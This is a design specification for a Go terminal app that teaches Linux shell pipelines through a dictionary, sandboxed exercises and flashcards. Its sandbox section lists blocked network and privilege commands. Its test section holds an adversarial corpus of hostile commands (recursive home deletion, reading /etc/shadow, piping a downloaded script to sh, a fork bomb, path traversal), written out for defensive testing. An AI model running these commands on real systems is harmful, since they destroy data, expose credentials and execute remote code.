# bash-teacher — Specification

A terminal UI that teaches Linux/Unix commands and, above all, how to *compose* them
into pipelines. Three learning surfaces — a **Dictionary**, **Pipeline Exercises**, and
**Flashcards** — share one content library and one progress model.

- **Status:** draft v0.1
- **Binary name:** `bt`
- **Stack:** Go 1.22+ with Bubble Tea **v2** / Lipgloss v2 / Bubbles v2
  (`charm.land/bubbletea/v2`, `charm.land/lipgloss/v2`, `charm.land/bubbles/v2`)
- **Distribution:** single static binary, content embedded via `go:embed`

---

## 1. Goals and non-goals

### Goals

1. Teach the ~80 commands that cover the overwhelming majority of real shell work,
   with their most-used flags — not exhaustive man pages.
2. Teach *composition*: the mental model of stdin → transform → stdout, and the
   recurring pipeline idioms (count-and-rank, filter-then-extract, find-and-act).
3. Build muscle memory through short, high-frequency recall drills with spaced
   repetition, so flags and idioms survive past the session.
4. Validate answers by **actually running them** against a fixture filesystem, so a
   learner is rewarded for any correct solution, not only the memorized one.
5. Work offline, install as one binary, and start in under 200 ms.

### Non-goals

- Not a shell replacement, not a man-page browser, not a general sandbox.
- Not a systems-administration course (no networking, systemd, or kernel material in v1).
- No account system, no telemetry, no network access of any kind at runtime.
- No Windows support in v1 (WSL is fine; native Windows is out of scope).

### Target learner

Someone who can `cd` and `ls` but freezes at `grep -rn ... | awk ... | sort | uniq -c`.
Secondary audience: an experienced user drilling flags they keep re-looking-up.

---

## 2. Product surfaces

The app opens on a **Home** screen showing today's review load, current streak, and
progress per topic, with four entries: Dictionary, Practice, Flashcards, Stats.

### 2.1 Dictionary

A searchable, browsable reference for every command in the library.

- **List pane (left):** commands grouped by category (Navigation, Inspection, Text
  Processing, Search, Streams & Redirection, Process Control, Archives, Permissions,
  Networking-lite). Fuzzy filter with `/`.
- **Detail pane (right):** for the selected command —
  - one-line summary and the "what it's *for*" sentence,
  - synopsis line,
  - a table of the flags worth knowing, each with a one-line gloss,
  - 3–6 worked examples, each with a caption explaining *why* you'd reach for it,
  - **"Plays well with"**: commands frequently piped before/after this one, each
    jumping to its own entry,
  - **"Seen in"**: links to the exercises and cards that use this command.
- **Actions:** `→` focuses the entry, where `↑`/`↓` walk its actionable items —
  examples, related commands, exercises — and `Enter` does the obvious thing with
  the focused one: copy the example, jump to the command, or open the exercise.
  `y` copies the focused example, `p` opens an exercise that teaches this command,
  `f` opens a review session drilling just that command, and `backspace` walks
  back out of a jump. A drill started this way ignores due dates — it is a
  request to practise one command, not to do the day's work — and `esc` returns
  to the scheduled queue.

Every dictionary entry is also reachable from anywhere with `?` (contextual lookup on
the command under the cursor in the exercise editor) — except inside the pipeline
editor itself, where `?` is a shell metacharacter the learner has to be able to type,
and the same lookup is `^G`.

### 2.2 Pipeline exercises (Practice)

The core of the product. A task is stated in prose; the learner writes a pipeline; the
pipeline is executed in a sandbox against a fixture filesystem; stdout is compared with
the expected output.

Screen layout:

```
┌ Task 12/40 · Text Processing · ●●●○○ ────────────────────────────┐
│ Given access.log, print the 5 IP addresses with the most         │
│ requests, most frequent first, as "<count> <ip>".                │
├─ Fixture ────────────────────────────────────────────────────────┤
│ access.log (2.3 KB, 120 lines)   app.log (1.1 KB, 70 lines)  ^B  │
├─ Your pipeline ──────────────────────────────────────────────────┤
│ $ cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -5 │
├─ Output ─────────────────────────────────────────────────────────┤
│      31 10.0.0.7            ✓ matches expected                   │
│      22 10.0.0.4                                                 │
│      ...                                                         │
└ ^R run · ^H hint · ^S solution · ^N next · ^B fixture · ^G lookup┘
```

Behaviour:

- **Editing** is a single-line editor with history (`↑`/`↓`), readline word motions
  (`^A`, `^E`, `^W`, `^U`, `^K`, `alt+←`/`alt+→`), and `tab` completion drawn from the
  dictionary: command names where a command may start, and that command's documented
  flags after a dash. Because the editor owns every printable key, every action on this
  screen is a chord — `^B` opens the fixture preview and `^G` is the dictionary lookup —
  and the global `1`–`4`, `q` and `/` bindings are suspended while it has the input.
- **Run** (`Ctrl-R`) executes and diffs. The diff is line-oriented and shows the first
  mismatching line with a caret, not a wall of red.
- **Hints** are tiered and cost nothing but are recorded: (1) a nudge at the concept
  level ("you need to count duplicates"), (2) the shape of the pipeline with commands
  blanked (`_____ | sort | _____ -c | ...`), (3) the reference solution with commentary.
- **Alternative solutions accepted:** any pipeline producing the expected stdout passes.
  After passing, the reference solution is shown side-by-side with the learner's, with a
  note when theirs is longer or spawns more processes ("`grep -c` would have saved a
  `wc`").
- **Constraints** (optional, per exercise): an exercise may require or forbid specific
  commands (`must_use: [awk]`, `forbid: [grep]`) to force a technique. Violations fail
  with an explanatory message rather than an output diff.
- **Progression:** exercises are ordered into tracks; a track unlocks the next when 80%
  of its exercises pass. Free-roam browsing of any unlocked exercise is always allowed.
  The lock is **advisory**: the browser shows each track's progress and says which ones
  are still ahead of the learner, but opens them anyway. The progress store now backs it
  with a real history, so the reason is no longer that memory would shut five of the six
  tracks every launch; it is that the dictionary's `p` shortcut addresses any exercise in
  the library, and a hard gate would have to refuse it. Enforcement, if it comes, is the
  browser's decision to make and not the storage's.

Exercise difficulty ladder (five levels): single command → command with flags →
two-stage pipe → three-or-more-stage pipe with a transform → real-world messy task
(quoting, field splitting, `xargs`, process substitution).

### 2.3 Flashcards

Short recall drills for muscle memory. Three card types:

| Type | Front | Back / answer | Graded by |
| --- | --- | --- | --- |
| `recall` | "Delete blank lines from a file" | `grep -v '^$' file` | typed answer, normalized match |
| `identify` | `sort -t: -k3 -n /etc/passwd` | "sort passwd numerically by 3rd colon-separated field" | self-graded (again/hard/good/easy) |
| `flag` | "`tar`: extract a gzipped archive verbosely" | `-xzvf` | typed answer, exact match |

- A session is a fixed-size queue (default 20 cards, configurable) built from cards due
  today plus new cards, capped by a daily new-card limit. Both caps are counted against
  what the log already holds for the day, so two sittings cannot together exceed one
  day's allowance.
- Typed answers are normalized before comparison: whitespace collapsed, quote style
  (`'`/`"`) equivalent, flag order within a cluster equivalent (`-la` ≡ `-al` ≡ `-l -a`),
  short/long flags equivalent when documented as such in the dictionary. Anything
  ambiguous falls back to self-grading rather than a false negative.

  Whether `-f3` is a cluster of two flags or one flag carrying the value `3` is a
  question about `cut`, not about shell syntax, so the normalizer is built from the
  dictionary's flag tables rather than from a list of special cases. Flags that carry
  values are compared by name, which keeps `cut -f3 -d,` equal to `cut -d, -f3` while
  leaving `sort -k1 -k2` distinct from `sort -k2 -k1`, where the order of two of the
  same flag is the whole meaning. Two answers that differ only inside quoted text — one
  regex or `sed` script against another — are handed to the learner to grade rather than
  marked wrong, and so is anything the parser cannot read.
- Grading is **FSRS-lite** (see §5). A wrong answer re-queues the card three places later
  in the same session, far enough to be recalled rather than echoed.
- **Rating keys** are letters, not the digits §5 numbers the ratings with: `1`–`4` are the
  global screen switches, and a learner mid-session must not be thrown to the dictionary
  by rating a card "again". `a`/`h`/`g`/`e` rate directly; `j` and `k` nudge the rating
  the answer earned and `enter` commits it. Each key is labelled with the interval it
  buys, so the choice between hard and good is a visible trade rather than a guess.
- Timer optional; when enabled, a soft target (default 8 s) nudges toward automaticity
  but never fails a card on time alone.

### 2.4 Stats

Retention curve, cards due over the next 14 days, exercises passed per track,
per-command mastery (a heat grid over the dictionary), and current/longest streak.

The review half of this is live as of M5 — what is due, how much of the deck has been
introduced, how much of it is being recalled, and the fortnight's outlook as a
sparkline. Since the progress store landed it reads a real history rather than the
session's own: the scheduler is restored at startup, so the streak counts days and not
minutes. The retention curve over time and the per-command mastery grid are still to
come; both are queries over the stored `reviews` log rather than new state.

---

## 3. Architecture

```
cmd/bt/main.go            entrypoint, flag parsing, TUI bootstrap
internal/tui/             Bubble Tea models: app, dictionary, practice, cards, stats
internal/content/         loader + validator for the YAML content library
internal/fuzzy/           subsequence matching and ranking for the search box
internal/runner/          sandboxed execution, fixture materialization, diffing
internal/srs/             scheduler (FSRS-lite), review log
internal/answer/          answer normalization and grading for typed flashcards
internal/store/           SQLite persistence (progress, review log, settings)
internal/config/          the optional TOML settings file
internal/shellparse/      pipeline tokenizer/AST used for safety checks and hints
internal/theme/           Catppuccin palettes and the shared Lip Gloss styles
content/                  the library itself (YAML + fixtures), embedded
```

- **One Bubble Tea v2 program**, one root model, a `screen` enum switching between
  sub-models. In v2 the alternate screen is a property of the returned `tea.View`
  rather than a program option, and key input arrives as `tea.KeyPressMsg`. Sub-models are independent `tea.Model`s so each is unit-testable headlessly
  by feeding `tea.KeyMsg`s and asserting on `View()`.
- **Execution is async**: `Ctrl-R` dispatches a `tea.Cmd` that runs the sandbox and
  returns a `runResultMsg`. The UI never blocks; a spinner shows after 150 ms.
- **Content is read-only at runtime**; all mutable state lives in SQLite at
  `$XDG_DATA_HOME/bash-teacher/progress.db` (falling back to `~/.local/share/...`).

---

## 4. Content model

Content is YAML, embedded at build time, and validated by `bt content lint` in CI.

### 4.1 Command entry

```yaml
# content/commands/sort.yaml
id: sort
name: sort
category: text
summary: Sort lines of text.
purpose: >
  Puts lines in order so that duplicates become adjacent — which is what makes
  `uniq` work — and so that "top N" questions become a `head` away.
synopsis: sort [OPTION]... [FILE]...
flags:
  - flag: "-n"
    gloss: Compare as numbers, not strings (so 9 sorts before 10).
  - flag: "-r"
    gloss: Reverse the result.
  - flag: "-k N[,M]"
    gloss: Sort by field N (through M), not the whole line.
  - flag: "-t CHAR"
    gloss: Use CHAR as the field separator instead of whitespace.
  - flag: "-u"
    gloss: Drop duplicate lines after sorting (like piping to `uniq`).
examples:
  - cmd: sort -rn counts.txt | head -5
    caption: The canonical "top 5" tail of a counting pipeline.
  - cmd: sort -t: -k3 -n /etc/passwd
    caption: Sort users by numeric UID, the third colon-separated field.
plays_well_with: [uniq, head, cut, awk, comm]
gotchas:
  - Plain `sort` is lexicographic — "10" comes before "9". Reach for `-n`.
  - "`sort | uniq` is not `sort -u` when you need `uniq -c` counts."
see_also: [uniq, comm, join]
```

### 4.2 Exercise

```yaml
# content/exercises/top-talkers.yaml
id: top-talkers
track: text-processing
level: 3
title: Top talkers in a log
prompt: >
  Using access.log, print the 5 IP addresses that made the most requests,
  most frequent first, formatted as the output of `uniq -c` (count then IP).
fixture: weblogs            # directory under content/fixtures/
expected_stdout_file: expected/top-talkers.txt
match: exact                # exact | trimmed | squeezed | unordered | regex
teaches: [cut, sort, uniq, head]
must_use: []
forbid: []
reference_solution: cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -5
solution_notes: >
  The `sort | uniq -c | sort -rn` sandwich is the single most reusable idiom in
  shell text processing. Learn it as one unit.
hints:
  - You need to count how many times each value appears — which command counts
    adjacent duplicates, and what has to be true of the input first?
  - "_____ -d' ' -f1 access.log | sort | _____ -c | sort -__ | head -5"
```

### 4.3 Flashcard

```yaml
# content/cards/text.yaml
- id: card-grep-blank
  type: recall
  front: Remove blank lines from a file.
  back: grep -v '^$' file
  accepts:                  # additional accepted answers
    - "grep . file"
    - "sed '/^$/d' file"
  commands: [grep]
- id: card-tar-extract
  type: flag
  front: "`tar`: extract a gzipped archive, verbosely."
  back: "-xzvf"
  commands: [tar]
```

### 4.4 Fixtures

Each fixture is a directory under `content/fixtures/<name>/` containing plain files
only (no symlinks, no executables, nothing over 256 KB). It is copied into a fresh temp
directory before each run, so exercises are free to mutate it and never leak between
runs.

### 4.5 v1 content budget

- **80 commands** across 9 categories.
- **120 exercises**, roughly 20/25/30/25/20 across levels 1–5, in 6 tracks:
  Files & Navigation, Inspection, Text Processing, Search & Find, Streams &
  Redirection, Real-World Pipelines.
- **250 flashcards**, every one linked to at least one dictionary command.

---

## 5. Spaced repetition

FSRS-lite: each card carries `stability`, `difficulty`, `due`, `reps`, `lapses`.

It is the same two-variable model as FSRS — stability is how long a memory lasts,
difficulty is how hard it is to keep — driven by the same power forgetting curve
`R(t) = (1 + 19/81 · t/S) ^ -0.5`, but with a handful of hand-chosen, documented
constants instead of nineteen fitted weights. There is no training corpus to fit weights
to and no way to collect one without telemetry, so a model a reader can predict beats
one that is merely more precise on somebody else's data. The two curve constants are
chosen together so that **at 90% retention the next interval is the stability itself**,
which is what makes a stability of 12 readable as "due in twelve days".

- Ratings: `again` (1), `hard` (2), `good` (3), `easy` (4). Typed-answer cards map a
  correct answer to `good` by default; `hard`/`easy` are still reachable with `j`/`k`
  before advancing, and a wrong answer is `again`.
- Intervals grow from stability with a configurable `desired_retention` (default 0.90).
  A learner rated `good` every time walks 3 → 5.1 → 8.7 → 15 → 26 → 44 → 77 days; `easy`
  roughly doubles that each step, and `hard` plateaus around two and a half days as
  difficulty rises. Intervals are capped at a year.
- `again` sets a 10-minute relearning step and increments `lapses`.
- Daily caps: `new_cards_per_day` (default 15), `max_reviews_per_day` (default 120).
- Passing an exercise credits every card in its `teaches` list with a half-strength
  `good` review — practice reinforces recall without double-counting it.
- The review log is append-only, so the scheduler can be swapped or re-simulated later
  without losing history.

---

## 6. Sandboxed execution

This is the security-critical component. Learner input is arbitrary shell text; it must
never be able to touch the real filesystem, the network, or long-running resources.

### 6.1 Pipeline

1. **Parse** the input with `internal/shellparse` into an AST of commands, arguments,
   pipes, and redirections. Reject on parse error with a friendly message.
2. **Static check** — reject before execution if the AST contains:
   - any command not on the **allowlist** (the set of commands in the dictionary, plus
     shell builtins `echo`, `printf`, `test`, `[`),
   - absolute paths outside the fixture root, or `..` escaping it. "Escaping" is decided
     by cleaning the path, not by looking for `..` in the text, so `cat ../../etc/passwd`
     is refused while `sed 's/../X/'` — where `..` is a regex — is not. A short list of
     device paths (`/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/zero`, `/dev/tty`,
     `/dev/random`, `/dev/urandom`, `/dev/stdin`) is exempt, because `2>/dev/null` is a
     core idiom the dictionary teaches; `/dev/full` is deliberately not on it.
   - a bare `/`, unless it follows a delimiter option (`-d`, `-t`, `-F`, …) or is an
     operand of `tr`, where it is a separator rather than the root directory,
   - The first operand of `sed`, `awk` and `grep` is exempt from the path rules
     entirely: it is a program or a pattern, not a filename, and programs routinely
     start with a slash (`sed -n '/start/,/end/p'`, `grep '^/usr/bin'`). The exemption
     is only for that operand, and it lapses when `-e`, `-f` or `--regexp` supplies the
     script instead, since then every operand really is a file: `grep -f /etc/passwd`
     is still refused.
   - `~` anywhere in an argument, since it expands outside the fixture,
   - variable assignment prefixes (`PATH=. cmd`): the sandbox environment is fixed,
   - `sudo`, `su`, `chmod +s`, `mount`, background jobs (`&`), `exec`, `eval`, `source`,
     `trap`, `ulimit`, `chroot`,
   - network-capable commands (`curl`, `wget`, `nc`, `ssh`) — these are teachable in the
     dictionary but never executable,
   - command substitution or `eval` in v1 (revisit once the parser is proven).

   Constructs the parser cannot represent — subshells, command groups, function
   definitions, process substitution, background jobs — are refused one step earlier, at
   parse time, with the offending character named. Every check reports **all** the
   problems it finds, the way the content linter does, rather than the first.
3. **Materialize** the fixture into a fresh temp dir (`os.MkdirTemp`).
4. **Execute** under OS-level confinement (§6.2) with `sh -c`, `cwd` at the fixture root,
   a scrubbed environment (`PATH`, `HOME`, `LANG=C`, `TZ=UTC` only), stdin `/dev/null`.
5. **Limit**: 3 s wall clock (SIGKILL to the whole process group on expiry), 5 s CPU,
   256 MB address space, 4 MB per written file, 1 MB captured stdout and stderr each
   (truncate with a notice), no core dumps. The limits are applied as a `ulimit` prelude
   prepended to the script, which is why `ulimit` itself is on the refusal list. The
   64-process cap is applied **only under `bwrap`**: `RLIMIT_NPROC` is accounted per real
   user id rather than per process tree, so outside a fresh user namespace it would count
   every process the learner already has running and stop the sandbox forking at all.
6. **Compare** stdout to the expected output per the exercise's `match` mode.
7. **Tear down** the temp dir unconditionally, including on panic.

### 6.2 OS-level confinement

- **Linux:** `bubblewrap` when present — read-only bind of `/usr`, `/bin`, `/lib*`, a
  tmpfs `/tmp`, the fixture bind-mounted read-write, `--unshare-all`, `--die-with-parent`.
  Fall back to `unshare -Urnm` when `bwrap` is missing.
- **macOS:** `sandbox-exec` with a generated profile denying all by default, allowing
  `process-exec` and read on system paths, read/write only under the temp fixture root,
  and denying `network*`. The profile must also allow reading the root directory
  (`(literal "/")`) and must be given the fixture path with symlinks resolved: without
  the former dyld aborts every process before `main` with no diagnostic, and without the
  latter nothing under `/var` — where macOS puts temp directories — matches.
- **Neither available:** the static allowlist plus rlimits still apply, and Home carries a
  standing line: *"⚠ Running without an OS sandbox — exercises execute with your normal
  user permissions."* This replaces the one-time banner originally specified: there is
  nowhere to record "already seen" until the store lands in M6, and a line that is always
  present is harder to miss than a banner that shows once. When confinement *is* active
  the same line names the backend instead, so the question is always answered. A
  `--no-exec` mode disables execution entirely and falls back to answer matching for
  users who want zero execution.

The confinement layer is an interface (`runner.Sandbox`) with `bwrap`, `sandboxExec`, and
`bare` implementations selected once at startup and reported in `bt doctor`.

### 6.3 Output diffing

- `exact`: byte equality after trailing-newline normalization.
- `trimmed`: per-line trailing whitespace stripped.
- `squeezed`: per-line leading and trailing whitespace stripped and internal runs
  collapsed to one space. This is what makes a counting exercise portable: GNU and BSD
  coreutils pad their numeric columns to different widths, so `uniq -c`, `wc -l` and
  `nl` outputs would otherwise pin an expected file to whichever coreutils generated it.
  The alignment is the tool's choice and never the learner's, so ignoring it costs
  nothing.
- `unordered`: multiset of lines (for tasks where order is genuinely unspecified).
- `regex`: the expected file is a regex, for outputs containing timestamps or sizes.

Failures render as a two-column diff of the first 10 differing lines, with a
`column N` caret on the first mismatching character of the first bad line.

---

## 7. Interaction design

### 7.1 Global keys

| Key | Action |
| --- | --- |
| `?` | Contextual help / dictionary lookup for the word under the cursor |
| `Esc` | Back one level; from Home, quit prompt |
| `Ctrl-C` | Quit immediately |
| `1`–`4` | Jump to Dictionary / Practice / Flashcards / Stats |
| `/` | Filter or search within the current list |
| `Tab` | Cycle panes within a screen |

Vim-style `hjkl` navigation everywhere, with arrow keys as equivalents. Every screen
shows its own key legend in the footer; nothing is hidden behind undiscoverable chords.

### 7.2 Visual design

- Lip Gloss theme built on the four [Catppuccin](https://catppuccin.com) flavours —
  Latte for light terminals, Frappé / Macchiato / Mocha for dark — selected with
  `--theme`, with `light` and `dark` as aliases for Latte and Mocha and `auto`
  detecting the background from `COLORFGBG` or a terminal query. `--theme none`,
  a non-terminal stdout, and `NO_COLOR` all degrade to plain text.
- Colours are named by role (`Accent`, `Pass`, `Fail`, `Warn`, `Dim`, `Faint`)
  rather than by hue, so a flavour swap can never change what a colour means.
  The theme paints no page background: the terminal's own shows through.
- Minimum usable terminal 80×24; layouts reflow above that. Below it, a single-pane
  fallback with a warning.
- Semantic color only: green pass, red fail, yellow hint-used, dim for chrome. Never
  color as the sole signal — pass/fail also carry `✓`/`✗`.

### 7.3 CLI surface

```
bt                      launch the TUI on Home
bt practice [track]     jump straight into practice
bt review               jump straight into the day's flashcards
bt dict <command>       print a dictionary entry to stdout and exit
bt stats                print a summary to stdout and exit
bt doctor               report sandbox backend, data dir, content version
bt content lint         validate the content library (used in CI)
bt content expected     re-run every reference solution and check the expected
                        outputs; --write regenerates them
bt export               dump progress to stdout as JSON
bt import [file]        restore progress from a JSON dump, or from stdin;
                        --force is required to replace progress already stored
```

`bt export` writes to stdout and takes no file operand: `bt export > backup.json` already
says where the dump goes, and a command that opened the file itself would owe an answer
about overwriting one already there. `bt import` reads a named file or stdin, and it is a
restore rather than a merge — the database afterwards holds what the export found, which
is the only reading under which a backup means anything. Because that discards whatever
was there, a database that already holds progress is refused unless `--force` says
otherwise, and the refusal names what would have been lost. The archive is read and
checked in full before the database is touched, and the replacement is one transaction, so
neither a file that is not an export nor a write that fails halfway can leave a learner
with half a history.

The JSON mirrors the schema of §8 column for column — Unix seconds with 0 for "never",
durations in milliseconds — which makes the round trip lossless by construction and
versions the archive by the schema it came from. An archive from an older schema restores
with the columns it predates left at zero, exactly as the migration that added them would
have; one from a newer schema is refused, like a database file from the future. Ids that
this build's content library has no entry for are reported as a warning rather than
refused: nothing ever shows a card that does not exist, and rejecting the file over a
renamed id would throw away the history of everything that still does.

Settings live in the TOML file described in §8.1; `bt doctor` prints its path, whether it
was read, and anything wrong with it. There is no `bt config` command: a file the learner
edits by hand is documented by `bt doctor` reading it back, not by a second way to write
it.

`--no-store` runs against no database at all: nothing is read at startup and nothing is
written, and the screens that would otherwise report a streak or a history say plainly
that this session is not being saved. It is what the TUI tests run under, and the escape
hatch for a machine whose data directory is not writable.

---

## 8. Persistence

SQLite (`modernc.org/sqlite`, cgo-free) at `$XDG_DATA_HOME/bash-teacher/progress.db`.

```sql
CREATE TABLE cards       (id TEXT PRIMARY KEY, stability REAL, difficulty REAL,
                          due INTEGER, reps INTEGER, lapses INTEGER, last_review INTEGER,
                          first_seen INTEGER);
CREATE TABLE reviews     (id INTEGER PRIMARY KEY, card_id TEXT, ts INTEGER,
                          rating INTEGER, elapsed_ms INTEGER, source TEXT);
CREATE TABLE attempts    (id INTEGER PRIMARY KEY, exercise_id TEXT, ts INTEGER,
                          input TEXT, passed INTEGER, hints_used INTEGER, ms INTEGER);
CREATE TABLE exercises   (id TEXT PRIMARY KEY, first_passed INTEGER, best_ms INTEGER,
                          attempts INTEGER, hints INTEGER, solution_shown INTEGER);
CREATE TABLE meta        (key TEXT PRIMARY KEY, value TEXT);
```

Two columns are there that the sketch above did not originally carry, both because a
screen needs them on the next launch and neither is derivable cheaply: `cards.first_seen`
is what the daily new-card cap counts against, and `exercises.hints` /
`solution_shown` restore what the learner had already uncovered, so a hint already spent
is not hidden again.

Timestamps are Unix seconds, and the zero time is stored as `0` rather than as an epoch
offset so that "never" reads back as never. The schema version lives in SQLite's
`user_version` pragma and migrations are numbered and forward-only, each in its own
transaction; a file written by a newer build is refused with a message rather than opened
and half-understood.

The store never computes anything. Every scheduling decision is a pure function of a
card's state and one rating, so what is written is what the scheduler already decided,
and `reviews` and `attempts` are append-only. That is what makes `cards` and `exercises`
caches in principle: both could be rebuilt from the two logs, which is also why a schema
change to either summary is cheap.

### 8.1 The settings file

Config is TOML at `$XDG_CONFIG_HOME/bash-teacher/config.toml`, and it is optional: a
learner who never writes one runs on the defaults, and a missing file is not an error.

```toml
[ui]
theme = "auto"              # a catppuccin flavour, or auto / none / dark / light

[review]
new_cards_per_day   = 15
max_reviews_per_day = 120
session_size        = 20
desired_retention   = 0.90
timer               = true  # show how long an answer took, and nudge past the target
soft_target         = "8s"
```

A file that *does* exist is taken at its word. An unknown key or an out-of-range value is
refused with a message rather than quietly dropped — a setting that does nothing and says
nothing is worse than no setting at all — and, as with the content linter, every problem
is reported at once so that fixing a file is one round trip. An unknown key is matched
against the real ones by leaf name, so `new_per_day` is answered with
`did you mean review.new_cards_per_day?` rather than with a list.

Being refused stops every command that reads it. `bt doctor` is the exception: it starts
on the defaults and prints the problems, because the command you reach for when something
is wrong has to run when something is wrong. `bt help` is answered before the file is
read at all, so a broken file cannot take away the page that documents it. `--theme` overrides the file, but only when it is actually passed;
its own default of `auto` is not an override.

Two knobs are deliberately not in the file. `relearn_step` is part of the model's shape
rather than of a learner's taste — SPEC §5 states it as ten minutes, and a file that put a
failed card back a fortnight away would not be expressing a preference but breaking the
scheduler. Editor keybindings are listed here as future work rather than as shipped: the
remapping needs to refuse a binding that collides with the global screen switches or with
a screen that is capturing text, and that validation is a change of its own.

---

## 9. Milestones

| Milestone | Contents | Exit criterion |
| --- | --- | --- |
| **M1 — Skeleton** ✅ | Bubble Tea v2 shell, Home, screen routing, theme, content loader + linter | `bt` runs, navigates, loads content |
| **M2 — Dictionary** ✅ | Full dictionary UI, fuzzy search, 80 command entries | Every command entry passes lint and renders |
| **M3 — Runner** ✅ | Parser, allowlist, sandbox backends, diffing, `bt doctor` | Adversarial test suite (§10) fully blocked |
| **M4 — Practice** ✅ | Exercise UI, hints, alternative-solution acceptance, tracks, 120 exercises | Reference solution of every exercise passes in CI |
| **M5 — Flashcards** ✅ | Card UI, answer normalization, FSRS-lite, daily queue, 250 cards | Scheduler simulation matches expected intervals |
| **M6 — Polish** | Progress store ✅, stats, config file ✅, export/import ✅, light theme, packaging (Homebrew, `.deb`, GitHub releases) | Cold start under 200 ms; 80×24 clean |

M6 is in progress. The progress store is built (`internal/store`): the scheduler and the
practice library are restored at startup and written through as the learner works, so
`bt` now remembers. The settings file is built (`internal/config`, §8.1), so the theme,
the daily caps, the retention target, the session size and the answer timer are the
learner's to set. `bt export` and `bt import` are built (§7.3), so progress survives a
machine. Still open: the historical half of Stats and the mastery grid, keybinding
remapping, and packaging. Light-theme detection is
in place — Latte ships and `theme.Resolve` reads `COLORFGBG` before querying the
terminal's background — so what is left there is confirming it on real terminals.

---

## 10. Testing

- **Content:** `bt content lint` enforces schema, unique ids, resolvable cross-references,
  fixture existence and size limits. CI runs every exercise's `reference_solution` in the
  sandbox and asserts it produces `expected_stdout`, so content can never drift, and
  asserts that everything an exercise claims to `teach` is something its own solution
  actually runs. `bt content expected --write` is how the expected files are produced in
  the first place; they are never written by hand.
- **Runner (adversarial):** a fixed corpus that must all be rejected or contained —
  `rm -rf ~`, `cat /etc/shadow`, `curl evil.sh | sh`, `:(){ :|:& };:`, `cat ../../../etc/passwd`,
  `yes > /dev/full`, symlink escapes, a 10 GB allocation, an infinite loop. Runs on both
  Linux and macOS CI images, and again with the `bare` backend to confirm the static
  allowlist alone still blocks the command-level cases.
- **TUI:** golden-file tests over `View()` at 80×24 and 120×40 after scripted key
  sequences; `teatest` for the async run flow.
- **SRS:** deterministic simulation of a 365-day learner, asserting review load stays
  within caps and retention converges on the target. It is two simulations, because the
  two claims are different: a *punctual* learner who answers each card the moment it
  falls due must hit the target retention, which is what the forgetting curve promises,
  while a *daily* learner who sits down once a day answers everything a few hours to a
  day late and lands about ten points below it. The first tests the model, the second
  bounds what day-granularity costs on top of it and checks the load settles rather than
  snowballing.
- **Store:** round-trip tests per table, plus a TUI-level test that answers a card and
  solves an exercise in one process and finds both waiting in the next. The round trip
  goes through the key flow rather than the store's API, because what has to survive is
  what the screens actually record. One test forges a `user_version` from the future and
  asserts the file is refused. `bt export` and `bt import` are tested through the same
  key flow: a filled database is dumped, restored into a second one, and compared against
  what the store's own loaders return, since what has to survive is the state the screens
  read rather than the shape of the file in between. The rest of the table covers what
  must be refused — an archive from a newer schema, a file that is not an export, a key
  nothing recognises, a database that would be clobbered without `--force` — and one case
  plants a duplicate primary key past the validator to prove that a failed import leaves
  the existing history untouched.
- **Answer normalization:** table-driven equivalence tests, including the cases that must
  *not* be treated as equivalent (`-rn` vs `-r -n` is fine; `-i` vs `-I` is not).

---

## 11. Open questions

1. Should the dictionary ship man-page excerpts (licensing) or stay entirely hand-written?
   Current assumption: hand-written, which is also better pedagogy.
2. GNU vs BSD coreutils divergence (`sed -i`, `date`, `xargs -r`) — flag differences per
   platform in the dictionary, or standardize on GNU and require it? Leaning toward
   annotating differences and having `bt doctor` report which the machine has.
3. A "sandbox playground" mode (free-form pipeline against a chosen fixture, no task) —
   valuable, but it widens the runner's exposure. Deferred to post-v1.
4. User-authored content packs: the YAML schema is designed for it, but loading
   non-embedded content means loading untrusted `must_use`/`forbid` and fixture paths.
   Needs a trust model before it ships.
